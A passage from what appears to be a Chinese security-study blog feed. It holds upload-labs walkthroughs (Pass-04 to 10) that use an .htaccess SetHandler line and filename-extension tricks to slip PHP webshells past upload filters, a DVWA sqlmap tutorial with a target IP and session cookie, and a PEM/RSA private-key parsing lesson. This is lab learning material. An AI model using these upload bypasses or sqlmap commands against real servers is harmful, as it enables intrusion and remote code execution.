src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092543725.png"><br>但我们发.htaccess没有被封禁，因此我们可以利用.htaccess文件来将后续的文件转变为.php文件。先创建.htaccess文件，内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">SetHandler application/x-httpd-php<br></code></pre></td></tr></table></figure><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092555106.png"></p><p>然后上传130_4.php文件，抓包，右键送入repeater，修改文件名后缀为.png，然后send，再查找上传路径</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092606385.png"></p><p>蚁剑连接成功</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092631432.png"></p><p>成功使用蚁剑getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092642245.png"></p><h4 id="（5）Pass-05"><a href="#（5）Pass-05" class="headerlink" title="（5）Pass-05"></a>（5）<strong>Pass-05</strong></h4><p>查看源码，仍然存在很多黑名单</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092656245.png"></p><p>而且我们上一关使用的.htaccess也被封禁</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092702961.png"></p><p>分析源码，发现代码会删除文件末尾的点和空格，因此这里使用“双写点+空格”进行绕过</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092713984.png"></p><p>进行蚁剑连接</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092722858.png"></p><p>成功使用蚁剑getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092736681.png"></p><h4 id="（6）Pass-06"><a href="#（6）Pass-06" class="headerlink" title="（6）Pass-06"></a>（6）<strong>Pass-06</strong></h4><p>分析源码，发现没有大小写转换的代码，因此尝试使用大小写绕过</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092746807.png"></p><p>bp抓包修改后缀名的大小写为.phP，并在Repeater中查看上传路径</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092755555.png"></p><p>进行蚁剑连接</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092802986.png"></p><p>成功使用蚁剑getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092813314.png"></p><h4 id="（7）Pass-07"><a href="#（7）Pass-07" class="headerlink" title="（7）Pass-07"></a>（7）<strong>Pass-07</strong></h4><p>分析源码，发现没有处理空格</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092819995.png"></p><p>因此使用空格绕过，同样的抓包步骤</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092835060.png"></p><p>蚁剑连接</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092846483.png"></p><p>成功使用蚁剑getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092853532.png"></p><h4 id="（8）Pass-08"><a href="#（8）Pass-08" class="headerlink" title="（8）Pass-08"></a>（8）<strong>Pass-08</strong></h4><p>分析源码，发现没有处理末尾的点</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092903914.png"></p><p>因此抓包在后缀名后添加点进行绕过</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092911367.png"></p><p>蚁剑连接</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092919001.png"></p><p>成功使用蚁剑getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092926821.png"></p><h4 id="（9）Pass-09"><a href="#（9）Pass-09" class="headerlink" title="（9）Pass-09"></a>（9）<strong>Pass-09</strong></h4><p>分析源码，发现未去除::$DATA</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092934051.png"></p><p>因此使用在后缀名末尾添加::$DATA，让php文件被当作文件流处理，便不会进行后缀名检查。进行bp抓包，发送到repeater</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708092944548.png"></p><p>蚁剑连接</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708093023270.png"></p><p>成功使用蚁剑getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708093030931.png"></p><h4 id="（10）Pass-10"><a href="#（10）Pass-10" class="headerlink" title="（10）Pass-10"></a>（10）<strong>Pass-10</strong></h4><p>分析源码，虽然文件对末尾的符号都进行了处理，但是没有进行后缀名双写的处理，因此可将文件名后缀改为.phpphp进行绕过</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708093043830.png"></p><p>Bp抓包，送入Repeater，修改文件后缀双写，并搜索到上传路径</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708093051665.png"></p><p>蚁剑连接</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708093059114.png"></p><p>成功使用蚁剑getshell</p><p><img src="/2025/07/08/Uploads-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%EF%BC%881-10%EF%BC%89/file-20250708093115655.png"></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web入门</title>
    <link href="/2025/07/04/Web%E5%85%A5%E9%97%A8/"/>
    <url>/2025/07/04/Web%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="一、sql注入"><a href="#一、sql注入" class="headerlink" title="一、sql注入"></a>一、sql注入</h1><p><strong>靶场：</strong> dvwa<br><strong>数据库：</strong> Mysql</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>SQL注入漏洞需要满足两个条件：</p><ul><li><strong>参数用户可控</strong></li><li><strong>参数带入数据库查询</strong><br>只有满足这两个条件才可能存在SQL注入漏洞</li></ul><h2 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h2><p>在实现SQL注入时，既可自己手动注入，也可使用攻击进行注入，这一节主要记录手动注入方法，使用工具的注入将在后文单独记录。</p><h2 id="注入工具使用"><a href="#注入工具使用" class="headerlink" title="注入工具使用"></a>注入工具使用</h2><h3 id="1-sqlmap"><a href="#1-sqlmap" class="headerlink" title="1.sqlmap"></a>1.sqlmap</h3><p><strong>下载官网：</strong> <a href="https://sqlmap.org/">https://sqlmap.org/</a></p><h4 id="sqlmap使用方法"><a href="#sqlmap使用方法" class="headerlink" title="sqlmap使用方法"></a>sqlmap使用方法</h4><p>所有参数都可使用<code>python sqlmap.py -h</code>查看</p><ul><li><strong>使用URL进行SQL注入</strong><br>使用<code>-u</code>参数，</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u <span class="hljs-string">&quot;http://159.75.236.232:8081/vulnerabilities/sqli/?id=1*&amp;Submit=Submit#&quot;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=6u59tajkoksou1f7ulk1lpgra3;security=low&quot;</span> --dbs<br></code></pre></td></tr></table></figure><p><img src="/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704145034446.png"></p><h4 id="sqlmap联合bupsuite进行注入"><a href="#sqlmap联合bupsuite进行注入" class="headerlink" title="sqlmap联合bupsuite进行注入"></a>sqlmap联合bupsuite进行注入</h4><p>打开火狐浏览器的bp代理，在提交前开启拦截，使用bp进行抓取数据包，然后点击<code>Save item</code>保存到本地为<code>txt</code>文件<br><img src="/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704145440655.png"><br>然后使用sqlmap的<code>-r</code>参数进行注入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -r C:\Users\Desktop\1.txt --dbs<br></code></pre></td></tr></table></figure><p><img src="/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704150750850.png"><br>之后根据扫描出的数据库，便可以进行进一步表的扫描<br>使用<code>-D dbname --tables</code>参数进行注入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -r C:\Users\29226\Desktop\1.txt -D dvwa --tables<br></code></pre></td></tr></table></figure><p><img src="/2025/07/04/Web%E5%85%A5%E9%97%A8/file-20250704151403241.png"></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto基础篇-PEM文件</title>
    <link href="/2025/07/03/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-PEM%E6%96%87%E4%BB%B6/"/>
    <url>/2025/07/03/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-PEM%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>PEM</strong>：Privacy Enhanced Mail，即增强隐私邮件，是一种主要用于SSL&#x2F;TLS通信、数字签名、加密通信等领域的文件格式。</p><p><strong>DER：</strong> 是一种广泛用于各种加密和安全通信协议中的二进制编码格式，尤其是X.509证书和PKCS#8私钥的存储和传输中。</p><p><strong>关系：</strong> PEM是DER证书的base64编码格式</p><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>根据传输的内容不同，PEM能被分为多种文件，主要包括以下三种</p><h3 id="1-证书"><a href="#1-证书" class="headerlink" title="1.证书"></a>1.证书</h3><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">-----</span><span class="hljs-comment">BEGIN CERTIFICATE</span><span class="hljs-literal">-----</span><br><span class="hljs-comment">(证书内容的base64格式)</span><br><span class="hljs-literal">-----</span><span class="hljs-comment">END CERTIFICATE</span><span class="hljs-literal">-----</span><br></code></pre></td></tr></table></figure><h3 id="2-公钥"><a href="#2-公钥" class="headerlink" title="2.公钥"></a>2.公钥</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">-----BEGIN <span class="hljs-keyword">PUBLIC</span> <span class="hljs-keyword">KEY</span>-----<br>(公钥的base64格式)<br>-----<span class="hljs-keyword">END</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-keyword">KEY</span>-----<br></code></pre></td></tr></table></figure><h3 id="3-私钥"><a href="#3-私钥" class="headerlink" title="3.私钥"></a>3.私钥</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">-----BEGIN <span class="hljs-keyword">PRIVATE</span> <span class="hljs-keyword">KEY</span>-----<br>(私钥的base64格式)<br>-----<span class="hljs-keyword">END</span> <span class="hljs-keyword">PRIVATE</span> <span class="hljs-keyword">KEY</span>-----<br></code></pre></td></tr></table></figure><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p><strong>示例：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN RSA PRIVATE KEY-----<br>MIICXAIBAAKBgQDnsN1F66mF6h6y/XpyN+ZU/w5AyeWBjZNIqi33/ATn4qQpw+kD<br>HrKyF7sQ/RNw6tibM90iM6VOA14305umPbPROJJs3JoB6Lao74SUm58aO9T+Ct7r<br>O52E+3r5jyDQicdRl6lIhLigNADXPD/KoNwfrRrCyw4wTHMZhSHc8eUHeQIDAQAB<br>AoGABVTIgqddiztL4Yp7ms02e5Yy2cLLiSOc0/s2e5JM+pj4dg2P+wZlzjtFjqqE<br>HAELYubam8LcduMU8+vmlPiufoK9fo47fLsX1PFCY9TDKL1dFlZgBAmJU7hR27h/<br>gCo4r3PMub/snq7n+skrbarZbX1J6Q1o5UYKFIrrIjNObEECQQD0DIzIdMObPUUu<br>W+JXg10kz/ayYn3irxZmp5ngc+b9WZfSOPehZBsLWsIb1eC7y9DZMhZfBQ/sPaO8<br>0tvqJMUFAkEA8wlj3B3zK20pK+Hj+vFiAlaQmqILTSfv/9jMm8tbVfXt+bHrmZdN<br>jruGVQDb7V2pW9HeG5PgDB3vKXeOiVfC5QJAYikKFzaf1rj2ModSqtBzjnL3Txi+<br>eYbjA7c19UmpBw4aOrwfHhMdrZt7p6aHFgIMps+2n9Fxbhv8194YBj1z4QJAPONW<br>XFg4iuGvVeoi9sSwvEs5sTP1xt/BlgSXxlRdTpztgQgdMX6hlKfQkM1FTCOSAYoD<br>rj8O+5ooR+hHEoulLQJBAOtaMvMWIOG7mARngpwqfJ07L41/T0ITHteiiYJfCurz<br>kLVCx1XA3MlN+u5gn7osUHMbah0Ze3uakSZ6za3mL5Y=<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p><strong>解析：</strong><br>将base64编码的字符串解码为十六进制表示的二进制数据：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">3082025</span><span class="hljs-keyword">c</span><span class="hljs-number">02010002818100e7</span>b<span class="hljs-number">0</span>dd<span class="hljs-number">45</span>eba<span class="hljs-number">985</span>ea<span class="hljs-number">1</span>eb<span class="hljs-number">2</span>fd<span class="hljs-number">7</span>a<span class="hljs-number">7237e654</span>ff<span class="hljs-number">0e40</span><span class="hljs-keyword">c</span><span class="hljs-number">9e5818</span>d<span class="hljs-number">9348</span>aa<span class="hljs-number">2</span>df<span class="hljs-number">7</span>fc<span class="hljs-number">04e7</span>e<span class="hljs-number">2</span>a<span class="hljs-number">429</span><span class="hljs-keyword">c</span><span class="hljs-number">3e9031</span>eb<span class="hljs-number">2</span>b<span class="hljs-number">217</span>bb<span class="hljs-number">10</span>fd<span class="hljs-number">1370</span>ead<span class="hljs-number">89</span>b<span class="hljs-number">33</span>dd<span class="hljs-number">2233</span>a<span class="hljs-number">54e035</span>e<span class="hljs-number">37</span>d<span class="hljs-number">39</span>ba<span class="hljs-number">63</span>db<span class="hljs-number">3</span>d<span class="hljs-number">138926</span>cdc<span class="hljs-number">9</span>a<span class="hljs-number">01e8</span>b<span class="hljs-number">6</span>a<span class="hljs-number">8</span>ef<span class="hljs-number">84949</span>b<span class="hljs-number">9</span>f<span class="hljs-number">1</span>a<span class="hljs-number">3</span>bd<span class="hljs-number">4</span>fe<span class="hljs-number">0</span>adeeb<span class="hljs-number">3</span>b<span class="hljs-number">9</span>d<span class="hljs-number">84</span>fb<span class="hljs-number">7</span>af<span class="hljs-number">98</span>f<span class="hljs-number">20</span>d<span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">75197</span>a<span class="hljs-number">94884</span>b<span class="hljs-number">8</span>a<span class="hljs-number">03400</span>d<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>fcaa<span class="hljs-number">0</span>dc<span class="hljs-number">1</span>fad<span class="hljs-number">1</span>ac<span class="hljs-number">2</span>cb<span class="hljs-number">0e304</span><span class="hljs-keyword">c</span><span class="hljs-number">73198521</span>dcf<span class="hljs-number">1e5077902030100010281800554</span><span class="hljs-keyword">c</span><span class="hljs-number">882</span>a<span class="hljs-number">75</span>d<span class="hljs-number">8</span>b<span class="hljs-number">3</span>b<span class="hljs-number">4</span>be<span class="hljs-number">18</span>a<span class="hljs-number">7</span>b<span class="hljs-number">9</span>acd<span class="hljs-number">367</span>b<span class="hljs-number">9632</span>d<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>cb<span class="hljs-number">89239</span>cd<span class="hljs-number">3</span>fb<span class="hljs-number">367</span>b<span class="hljs-number">924</span>cfa<span class="hljs-number">98</span>f<span class="hljs-number">8760</span>d<span class="hljs-number">8</span>ffb<span class="hljs-number">0665</span>ce<span class="hljs-number">3</span>b<span class="hljs-number">458</span>eaa<span class="hljs-number">841</span><span class="hljs-keyword">c</span><span class="hljs-number">010</span>b<span class="hljs-number">62e6</span>da<span class="hljs-number">9</span>bc<span class="hljs-number">2</span>dc<span class="hljs-number">76e314</span>f<span class="hljs-number">3</span>ebe<span class="hljs-number">694</span>f<span class="hljs-number">8</span>ae<span class="hljs-number">7e82</span>bd<span class="hljs-number">7e8</span>e<span class="hljs-number">3</span>b<span class="hljs-number">7</span>cbb<span class="hljs-number">17</span>d<span class="hljs-number">4</span>f<span class="hljs-number">14263</span>d<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">328</span>bd<span class="hljs-number">5</span>d<span class="hljs-number">16566004098953</span>b<span class="hljs-number">851</span>dbb<span class="hljs-number">87</span>f<span class="hljs-number">802</span>a<span class="hljs-number">38</span>af<span class="hljs-number">73</span>ccb<span class="hljs-number">9</span>bfec<span class="hljs-number">9</span>eaee<span class="hljs-number">7</span>fac<span class="hljs-number">92</span>b<span class="hljs-number">6</span>daad<span class="hljs-number">96</span>d<span class="hljs-number">7</span>d<span class="hljs-number">49e90</span>d<span class="hljs-number">68e5460</span>a<span class="hljs-number">148</span>aeb<span class="hljs-number">22334e6</span><span class="hljs-keyword">c</span><span class="hljs-number">41024100</span>f<span class="hljs-number">40</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span><span class="hljs-keyword">cc</span><span class="hljs-number">874</span><span class="hljs-keyword">c</span><span class="hljs-number">39</span>b<span class="hljs-number">3</span>d<span class="hljs-number">452e5</span>be<span class="hljs-number">257835</span>d<span class="hljs-number">24</span>cff<span class="hljs-number">6</span>b<span class="hljs-number">2627</span>de<span class="hljs-number">2</span>af<span class="hljs-number">1666</span>a<span class="hljs-number">799e073</span>e<span class="hljs-number">6</span>fd<span class="hljs-number">5997</span>d<span class="hljs-number">238</span>f<span class="hljs-number">7</span>a<span class="hljs-number">1641</span>b<span class="hljs-number">0</span>b<span class="hljs-number">5</span>ac<span class="hljs-number">21</span>bd<span class="hljs-number">5e0</span>bbcbd<span class="hljs-number">0</span>d<span class="hljs-number">932165</span>f<span class="hljs-number">050</span>fec<span class="hljs-number">3</span>da<span class="hljs-number">3</span>bcd<span class="hljs-number">2</span>dbea<span class="hljs-number">24</span><span class="hljs-keyword">c</span><span class="hljs-number">505024100</span>f<span class="hljs-number">30963</span>dc<span class="hljs-number">1</span>df<span class="hljs-number">32</span>b<span class="hljs-number">6</span>d<span class="hljs-number">292</span>be<span class="hljs-number">1e3</span>faf<span class="hljs-number">1620256909</span>aa<span class="hljs-number">20</span>b<span class="hljs-number">4</span>d<span class="hljs-number">27</span>efffd<span class="hljs-number">8</span><span class="hljs-keyword">cc</span><span class="hljs-number">9</span>bcb<span class="hljs-number">5</span>b<span class="hljs-number">55</span>f<span class="hljs-number">5</span>edf<span class="hljs-number">9</span>b<span class="hljs-number">1</span>eb<span class="hljs-number">99974</span>d<span class="hljs-number">8</span>ebb<span class="hljs-number">865500</span>dbed<span class="hljs-number">5</span>da<span class="hljs-number">95</span>bd<span class="hljs-number">1</span>de<span class="hljs-number">1</span>b<span class="hljs-number">93e00</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>def<span class="hljs-number">29778e8957</span><span class="hljs-keyword">c</span><span class="hljs-number">2e5024062290</span>a<span class="hljs-number">17369</span>fd<span class="hljs-number">6</span>b<span class="hljs-number">8</span>f<span class="hljs-number">6328752</span>aad<span class="hljs-number">0738e72</span>f<span class="hljs-number">74</span>f<span class="hljs-number">18</span>be<span class="hljs-number">7986e303</span>b<span class="hljs-number">735</span>f<span class="hljs-number">549</span>a<span class="hljs-number">9070e1</span>a<span class="hljs-number">3</span>abc<span class="hljs-number">1</span>f<span class="hljs-number">1e131</span>dad<span class="hljs-number">9</span>b<span class="hljs-number">7</span>ba<span class="hljs-number">7</span>a<span class="hljs-number">68716020</span>ca<span class="hljs-number">6</span>cfb<span class="hljs-number">69</span>fd<span class="hljs-number">1716e1</span>bfcd<span class="hljs-number">7</span>de<span class="hljs-number">18063</span>d<span class="hljs-number">73e102403</span>ce<span class="hljs-number">3565</span><span class="hljs-keyword">c</span><span class="hljs-number">58388</span>ae<span class="hljs-number">1</span>af<span class="hljs-number">55</span>ea<span class="hljs-number">22</span>f<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>b<span class="hljs-number">0</span>bc<span class="hljs-number">4</span>b<span class="hljs-number">39</span>b<span class="hljs-number">133</span>f<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>dfc<span class="hljs-number">1960497</span><span class="hljs-keyword">c</span><span class="hljs-number">6545</span>d<span class="hljs-number">4e9</span>ced<span class="hljs-number">81081</span>d<span class="hljs-number">317</span>ea<span class="hljs-number">194</span>a<span class="hljs-number">7</span>d<span class="hljs-number">090</span>cd<span class="hljs-number">454</span><span class="hljs-keyword">c</span><span class="hljs-number">2392018</span>a<span class="hljs-number">03</span>ae<span class="hljs-number">3</span>f<span class="hljs-number">0</span>efb<span class="hljs-number">9</span>a<span class="hljs-number">2847e847128</span>ba<span class="hljs-number">52</span>d<span class="hljs-number">024100</span>eb<span class="hljs-number">5</span>a<span class="hljs-number">32</span>f<span class="hljs-number">31620e1</span>bb<span class="hljs-number">980467829</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>a<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>d<span class="hljs-number">3</span>b<span class="hljs-number">2</span>f<span class="hljs-number">8</span>d<span class="hljs-number">7</span>f<span class="hljs-number">4</span>f<span class="hljs-number">42131</span>ed<span class="hljs-number">7</span>a<span class="hljs-number">289825</span>f<span class="hljs-number">0</span>aeaf<span class="hljs-number">390</span>b<span class="hljs-number">542</span><span class="hljs-keyword">c</span><span class="hljs-number">755</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>dcc<span class="hljs-number">94</span>dfaee<span class="hljs-number">609</span>fba<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">50731</span>b<span class="hljs-number">6</span>a<span class="hljs-number">1</span>d<span class="hljs-number">197</span>b<span class="hljs-number">7</span>b<span class="hljs-number">9</span>a<span class="hljs-number">91267</span>acdade<span class="hljs-number">62</span>f<span class="hljs-number">96</span><br></code></pre></td></tr></table></figure><p><strong>数据拆分：</strong><br>私钥的格式如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">RSAPrivateKey ::= <span class="hljs-keyword">SEQUENCE</span> &#123;<br>  <span class="hljs-keyword">version</span>           <span class="hljs-keyword">Version</span>,           <span class="hljs-comment">-- INTEGER（一般是 0）</span><br>  modulus           <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- n</span><br>  publicExponent    <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- e</span><br>  privateExponent   <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- d</span><br>  prime1            <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- p</span><br>  prime2            <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- q</span><br>  exponent1         <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- d mod (p-1)</span><br>  exponent2         <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- d mod (q-1)</span><br>  coefficient       <span class="hljs-type">INTEGER</span>,           <span class="hljs-comment">-- q^(-1) mod p</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>3082 025c：</strong> 30变送SEQUENCE类型，025c指下面文件内容的字节数（0x025c是572字节）</li><li><strong>02 01 00：</strong> 版本，02表示整型，01表示长度为1字节，00表示版本号为0</li><li><strong>02 81 81：</strong> 模数n，02表示整型，长度为129字节（0x81）</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">n <span class="hljs-operator">=</span> <span class="hljs-number">00e7</span>b<span class="hljs-number">0</span>dd<span class="hljs-number">45</span>eba<span class="hljs-number">985</span>ea<span class="hljs-number">1</span>eb<span class="hljs-number">2</span>fd<span class="hljs-number">7</span>a<span class="hljs-number">7237e654</span>ff<span class="hljs-number">0e40</span><span class="hljs-keyword">c</span><span class="hljs-number">9e5818</span>d<span class="hljs-number">9348</span>aa<span class="hljs-number">2</span>df<span class="hljs-number">7</span>fc<span class="hljs-number">04e7</span>e<span class="hljs-number">2</span>a<span class="hljs-number">429</span><span class="hljs-keyword">c</span><span class="hljs-number">3e9031</span>eb<span class="hljs-number">2</span>b<span class="hljs-number">217</span>bb<span class="hljs-number">10</span>fd<span class="hljs-number">1370</span>ead<span class="hljs-number">89</span>b<span class="hljs-number">33</span>dd<span class="hljs-number">2233</span>a<span class="hljs-number">54e035</span>e<span class="hljs-number">37</span>d<span class="hljs-number">39</span>ba<span class="hljs-number">63</span>db<span class="hljs-number">3</span>d<span class="hljs-number">138926</span>cdc<span class="hljs-number">9</span>a<span class="hljs-number">01e8</span>b<span class="hljs-number">6</span>a<span class="hljs-number">8</span>ef<span class="hljs-number">84949</span>b<span class="hljs-number">9</span>f<span class="hljs-number">1</span>a<span class="hljs-number">3</span>bd<span class="hljs-number">4</span>fe<span class="hljs-number">0</span>adeeb<span class="hljs-number">3</span>b<span class="hljs-number">9</span>d<span class="hljs-number">84</span>fb<span class="hljs-number">7</span>af<span class="hljs-number">98</span>f<span class="hljs-number">20</span>d<span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">75197</span>a<span class="hljs-number">94884</span>b<span class="hljs-number">8</span>a<span class="hljs-number">03400</span>d<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>fcaa<span class="hljs-number">0</span>dc<span class="hljs-number">1</span>fad<span class="hljs-number">1</span>ac<span class="hljs-number">2</span>cb<span class="hljs-number">0e304</span><span class="hljs-keyword">c</span><span class="hljs-number">73198521</span>dcf<span class="hljs-number">1e50779</span><br></code></pre></td></tr></table></figure><ul><li><strong>02 03：</strong> 公钥指数e，02表示整型（此位置若是03表示 BIT STRING），03长度为3字节</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">e</span> <span class="hljs-operator">=</span> <span 